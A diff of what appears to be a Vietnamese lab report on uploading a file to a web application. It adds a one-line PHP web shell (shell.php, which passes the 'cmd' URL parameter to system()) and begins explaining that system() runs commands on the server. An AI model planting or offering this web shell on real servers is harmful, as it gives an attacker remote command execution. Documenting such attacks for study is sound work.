@@ -21,7 +21,9 @@ Hình 3. 3 Giao diện đăng kí tài khoản
 Nội dung file shell.php như sau:
  
 Hình 3. 4 Nội dung file shell.php
+<?php
 
+system($_GET['cmd']);
 Giải thích nội dung của file shell.php:
 1.	system():
 	Hàm system() trong PHP được sử dụng để chạy một lệnh hệ thống (command) trên máy chủ nơi mã PHP được thực thi.
